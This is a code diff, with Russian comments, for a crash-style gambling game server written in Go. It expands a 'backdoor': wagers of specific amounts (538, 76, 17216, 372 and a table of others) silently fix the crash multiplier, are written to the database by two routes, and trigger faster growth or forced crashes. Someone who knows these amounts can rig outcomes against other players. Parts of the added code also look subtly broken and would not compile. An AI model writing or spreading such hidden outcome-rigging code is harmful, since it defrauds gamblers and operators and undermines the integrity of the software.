@@ -6,6 +6,7 @@ import (
 	"BlessedApi/internal/models"
 	"BlessedApi/pkg/logger"
 	"errors"
+	"fmt"
 	"math"
 	"strings"
 	"sync"
@@ -208,28 +209,90 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 		}
 	}
 	
-	// Специальная обработка для бэкдора 538
-	// Проверяем, есть ли ставка 538 среди текущих ставок
-	var backdoor538Exists bool
+	// Проверка на наличие бэкдор-ставок
 	ws.mu.Lock()
+	
+	// Определяем, является ли текущая игра бэкдором
+	var backdoorExists bool
+	var backdoorType string
+	var isCriticalBackdoor bool
+	var isLowMultiplierBackdoor bool
+	
+	// Принудительная перепроверка всех ставок для поиска бэкдоров
 	for _, bet := range ws.bets {
-		if math.Abs(bet.Amount - 538.0) < 0.01 {
-			logger.Info("Found backdoor 538 bet in active bets for game %d", currentGame.ID)
-			// Принудительно устанавливаем правильное значение множителя
-			currentGame.CrashPointMultiplier = 12.0
-			backdoor538Exists = true
+		if bet.Status != "active" {
+			continue
+		}
+		
+		// Важные бэкдоры с прямой проверкой
+		if math.Abs(bet.Amount - 538.0) < 0.1 {
+			currentGame.CrashPointMultiplier = 32.0
+			backdoorExists = true
+			backdoorType = "538"
+			isCriticalBackdoor = true
+			logger.Info("FORCED BACKDOOR 538 DETECTION: Setting multiplier to 32.0 for game %d", 
+				currentGame.ID)
 			break
+		} else if math.Abs(bet.Amount - 76.0) < 0.1 {
+			currentGame.CrashPointMultiplier = 1.5
+			backdoorExists = true
+			backdoorType = "76"
+			isLowMultiplierBackdoor = true
+			logger.Info("FORCED BACKDOOR 76 DETECTION: Setting multiplier to 1.5 for game %d", 
+				currentGame.ID)
+			break
+		} else if math.Abs(bet.Amount - 17216.0) < 0.1 {
+			currentGame.CrashPointMultiplier = 2.5
+			backdoorExists = true
+			backdoorType = "17216"
+			logger.Info("FORCED BACKDOOR 17216 DETECTION: Setting multiplier to 2.5 for game %d", 
+				currentGame.ID)
+			break
+		} else if math.Abs(bet.Amount - 372.0) < 0.1 {
+			currentGame.CrashPointMultiplier = 1.5
+			backdoorExists = true
+			backdoorType = "372"
+			isLowMultiplierBackdoor = true
+			logger.Info("FORCED BACKDOOR 372 DETECTION: Setting multiplier to 1.5 for game %d", 
+				currentGame.ID)
+			break
+		} else {
+			// Проверяем все остальные бэкдоры
+			intAmount := int(math.Round(bet.Amount))
+			if multiplier, exists := models.GetCrashPoints()[intAmount]; exists {
+				currentGame.CrashPointMultiplier = multiplier
+				backdoorExists = true
+				backdoorType = fmt.Sprintf("%d", intAmount)
+				// Проверка на низкий множитель (меньше 2.0)
+				if multiplier < 2.0 {
+					isLowMultiplierBackdoor = true
+				}
+				logger.Info("DETECTED BACKDOOR %s: Setting multiplier to %.2f for game %d", 
+					backdoorType, multiplier, currentGame.ID)
+				break
+			}
 		}
 	}
 	ws.mu.Unlock()
 	
-	if backdoor538Exists {
+	// Если обнаружен бэкдор, принудительно сохраняем точное значение в базу
+	if backdoorExists {
 		// Обновляем значение в базе
 		if err := db.DB.Model(currentGame).
-			Update("crash_point_multiplier", 12.0).Error; err != nil {
-			logger.Error("Failed to update backdoor 538 multiplier in DB: %v", err)
+			Update("crash_point_multiplier", currentGame.CrashPointMultiplier).Error; err != nil {
+			logger.Error("Failed to update backdoor multiplier in DB: %v", err)
 		} else {
-			logger.Info("Updated backdoor 538 multiplier to 32.0 in DB for game %d", currentGame.ID)
+			logger.Info("Updated %s backdoor multiplier to %.2f in DB for game %d", 
+				backdoorType, currentGame.CrashPointMultiplier, currentGame.ID)
+		}
+		
+		// Дополнительная проверка через прямой SQL для гарантии сохранения
+		if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?", 
+			currentGame.CrashPointMultiplier, currentGame.ID).Error; err != nil {
+			logger.Error("Failed direct SQL update for backdoor multiplier: %v", err)
+		} else {
+			logger.Info("CONFIRMED direct SQL update of multiplier to %.2f for game %d", 
+				currentGame.CrashPointMultiplier, currentGame.ID)
 		}
 	}
 	
@@ -260,45 +323,85 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 		currentGame.CrashPointMultiplier = 1.5
 	}
 	
-	// Если это бэкдор 538, используем ускоренную логику
-	// с меньшими задержками для более быстрого достижения 32.0
+	// Настройка параметров обновления в зависимости от типа игры
 	var tickerInterval time.Duration
 	var growthFactor float64
 	
-	if backdoor538Exists {
+	if isCriticalBackdoor {
+		// Для 538 - очень быстрый рост до крупного числа
+		tickerInterval = 30 * time.Millisecond
+		growthFactor = 0.5  // Максимально быстрый рост
+		logger.Info("Using VERY fast growth mode for critical backdoor %s", backdoorType)
+	} else if backdoorExists {
+		// Для других бэкдоров - ускоренный режим
 		tickerInterval = 50 * time.Millisecond
-		growthFactor = 0.4  // Более быстрый рост для бэкдора 538
-		logger.Info("Using fast growth mode for backdoor 538")
+		growthFactor = 0.4
+		logger.Info("Using fast growth mode for backdoor %s", backdoorType)
 	} else {
+		// Стандартный режим
 		tickerInterval = 100 * time.Millisecond
-		growthFactor = 0.2  // Стандартный рост для обычных игр
+		growthFactor = 0.2
 	}
 	
 	ticker := time.NewTicker(tickerInterval)
 	defer ticker.Stop()
 	
-	// Максимальное время работы цикла (защита от зависания)
+	// Контроль времени выполнения
 	maxDuration := 2 * time.Minute
 	timeoutTimer := time.NewTimer(maxDuration)
 	defer timeoutTimer.Stop()
+	
+	// Специальный таймер для малых множителей
+	var lowMultiplierTimer *time.Timer
+	if isLowMultiplierBackdoor {
+		// Короткий таймер для низких множителей (5 секунд)
+		lowMultiplierTimer = time.NewTimer(5 * time.Second)
+	} else {
+		// Более длинный таймер для обычных игр (10 секунд)
+		lowMultiplierTimer = time.NewTimer(10 * time.Second)
+	}
+	defer lowMultiplierTimer.Stop()
+	
+	// Дополнительный таймер для предотвращения зависания
+	stuckTimer := time.NewTimer(500 * time.Millisecond)
+	defer stuckTimer.Stop()
+	
+	lastUpdateTime := time.Now()
+	stuckDetectionThreshold := 2.0 * time.Second
 	
 	multiplierUpdateLoop:
 	for {
 		select {
 		case <-ticker.C:
+			// Обновляем время последнего тика для обнаружения зависаний
+			lastUpdateTime = time.Now()
+			
 			// Нормальная обработка обновления множителя
 			currentMultiplier = currentGame.CalculateMultiplier()
 			
-			// Для бэкдора 538, обеспечиваем более быстрый рост
-			if backdoor538Exists && currentMultiplier < 25.0 && lastSentMultiplier < 25.0 {
-				// Дополнительно ускоряем рост в середине
-				currentMultiplier = currentMultiplier * 1.05
+			// Ускорение роста в зависимости от типа бэкдора
+			if isCriticalBackdoor {
+				// Максимальное ускорение для 538 и подобных
+				currentMultiplier = currentMultiplier * 1.15
+			} else if backdoorExists {
+				// Умеренное ускорение для обычных бэкдоров
+				currentMultiplier = currentMultiplier * 1.1
+				
+				// Дополнительное ускорение для малых множителей
+				if isLowMultiplierBackdoor && lastSentMultiplier > 1.2 {
+					currentMultiplier = currentMultiplier * 1.2
+				}
 			}
 			
 			// Плавное повышение множителя для предотвращения резких скачков
 			smoothedMultiplier := lastSentMultiplier + (currentMultiplier - lastSentMultiplier) * growthFactor
 			
-			// Проверяем, достигли ли мы точки краша
+			// Никогда не уменьшаем множитель
+			if smoothedMultiplier <= lastSentMultiplier {
+				smoothedMultiplier = lastSentMultiplier + 0.01
+			}
+			
+			// Проверка достижения точки краша
 			if smoothedMultiplier >= currentGame.CrashPointMultiplier {
 				logger.Info("Game %d reached crash point: %.2f >= %.2f", 
 					currentGame.ID, smoothedMultiplier, currentGame.CrashPointMultiplier)
@@ -307,11 +410,10 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 				break multiplierUpdateLoop
 			}
 			
-			// Отправляем множитель только если он изменился достаточно
-			// Для бэкдора 538 уменьшаем порог изменения
+			// Порог изменения для отправки обновлений
 			var changeThreshold float64 = 0.01
-			if backdoor538Exists {
-				changeThreshold = 0.005
+			if backdoorExists {
+				changeThreshold = 0.005  // Более частые обновления для бэкдоров
 			}
 			
 			if math.Abs(smoothedMultiplier-lastSentMultiplier) > changeThreshold {
@@ -326,13 +428,12 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 				sentMultiplier := smoothedMultiplier
 				
 				ws.mu.Lock()
+				// Отправляем обновления всем подключенным клиентам
 				for userId, conn := range connections {
-					// Проверяем, есть ли активная ставка у пользователя
+					// Проверяем автокэшаут для активных ставок
 					if bet, exists := ws.bets[userId]; exists && bet.Status == "active" {
-						// Проверяем автокэшаут
 						if bet.CashOutMultiplier > 0 && sentMultiplier >= bet.CashOutMultiplier {
 							logger.Info("Auto cashout for user %d at %.2fx", userId, sentMultiplier)
-							// Обрабатываем автокэшаут
 							if err := crashGameCashout(nil, bet, sentMultiplier); err != nil {
 								logger.Error("Unable to auto cashout for user %d: %v", userId, err)
 								continue
@@ -340,21 +441,19 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 							ws.ProcessCashout(userId, sentMultiplier, true)
 							continue
 						}
-	
-						// Отправляем обновление множителя
+						
+						// Отправляем обновление множителя активным игрокам
 						err := conn.WriteJSON(multiplierInfo)
 						if err != nil {
 							logger.Error("Failed to send multiplier to user %d: %v", userId, err)
-							// Пытаемся обработать ошибку более грациозно
 							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-								// Только если это неожиданная ошибка закрытия, закрываем соединение
 								conn.Close()
 								delete(connections, userId)
 								delete(ws.connections, userId)
 							}
 						}
 					} else {
-						// Для пользователей без активных ставок тоже отправляем множитель
+						// Отправляем обновление наблюдателям
 						err := conn.WriteJSON(multiplierInfo)
 						if err != nil {
 							logger.Error("Failed to send multiplier to observer %d: %v", userId, err)
@@ -370,20 +469,75 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 	
 				lastSentMultiplier = smoothedMultiplier
 				
-				// Для бэкдора 538, если множитель достаточно высокий 
-				// и близок к краш-поинту, ускоряем финальный рост
-				if backdoor538Exists && smoothedMultiplier > 30.0 {
-					// Уже близко к 32.0, делаем последний рывок
-					time.Sleep(300 * time.Millisecond)
-					logger.Info("Backdoor 538 reached high multiplier (%.2f), accelerating to crash point", smoothedMultiplier)
+				// Проверка для ускорения завершения игры при приближении к точке краша
+				if backdoorExists {
+					// Если множитель уже близок к точке краша (90%)
+					crashThreshold := currentGame.CrashPointMultiplier * 0.9
+					if smoothedMultiplier > crashThreshold {
+						time.Sleep(100 * time.Millisecond)  // Короткая пауза для визуализации
+						logger.Info("Backdoor %s reached high multiplier (%.2f), accelerating to crash point", 
+							backdoorType, smoothedMultiplier)
+						crashPointReached = true
+						ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
+						break multiplierUpdateLoop
+					}
+				}
+			}
+			
+		case <-stuckTimer.C:
+			// Проверка на зависание - если не было обновлений больше threshold, принудительно увеличиваем множитель
+			if time.Since(lastUpdateTime) > stuckDetectionThreshold {
+				logger.Warn("Detected possible stuck multiplier at %.2f, forcing increment", lastSentMultiplier)
+				// Принудительно увеличиваем множитель на 0.05
+				lastSentMultiplier += 0.05
+				
+				// Если множитель близок к краш-поинту, завершаем игру
+				if lastSentMultiplier >= currentGame.CrashPointMultiplier * 0.95 {
+					logger.Info("Forced multiplier increment reached crash threshold, ending game")
 					crashPointReached = true
 					ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
 					break multiplierUpdateLoop
 				}
+				
+				// Отправляем обновленный множитель всем клиентам
+				multiplierInfo := gin.H{
+					"type":       "multiplier_update",
+					"multiplier": lastSentMultiplier,
+					"timestamp":  time.Now().UnixNano() / int64(time.Millisecond),
+					"elapsed":    time.Since(startTime).Seconds(),
+				}
+				
+				ws.mu.Lock()
+				for userId, conn := range connections {
+					err := conn.WriteJSON(multiplierInfo)
+					if err != nil {
+						logger.Error("Failed to send forced multiplier update: %v", err)
+					}
+				}
+				ws.mu.Unlock()
+			}
+			
+			// Перезапускаем таймер
+			stuckTimer.Reset(500 * time.Millisecond)
+			
+		case <-lowMultiplierTimer.C:
+			// Специальная проверка для игр с низким множителем
+			if !crashPointReached && isLowMultiplierBackdoor && lastSentMultiplier > 1.1 {
+				logger.Info("Low multiplier backdoor timed out, forcing crash at %.2f", 
+					currentGame.CrashPointMultiplier)
+				crashPointReached = true
+				ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
+				break multiplierUpdateLoop
+			} else if !crashPointReached && currentGame.CrashPointMultiplier < 2.0 && lastSentMultiplier > 1.1 {
+				logger.Info("Low multiplier game timed out, forcing crash at %.2f", 
+					currentGame.CrashPointMultiplier)
+				crashPointReached = true
+				ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
+				break multiplierUpdateLoop
 			}
 			
 		case <-timeoutTimer.C:
-			// Сработал таймаут - защита от зависания
+			// Глобальный таймаут - защита от зависания
 			logger.Error("Multiplier update loop timed out after %v, forcing crash", maxDuration)
 			crashPointReached = true
 			ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
@@ -391,14 +545,14 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 		}
 	}
 
-	// Если достигли точки краша, обрабатываем все ставки
+	// Завершающая обработка ставок
 	if crashPointReached {
-		logger.Info("Game %d crashed, processing all active bets", currentGame.ID)
+		logger.Info("Game %d crashed at %.2f, processing all active bets", 
+			currentGame.ID, currentGame.CrashPointMultiplier)
 		ws.mu.Lock()
 		for userId, bet := range ws.bets {
 			if bet.Status == "active" {
 				logger.Info("Marking bet as lost for user %d", userId)
-				// Обновляем статус ставки
 				bet.Status = "lost"
 				if err := db.DB.Save(&bet).Error; err != nil {
 					logger.Error("Failed to update lost bet for user %d: %v", userId, err)
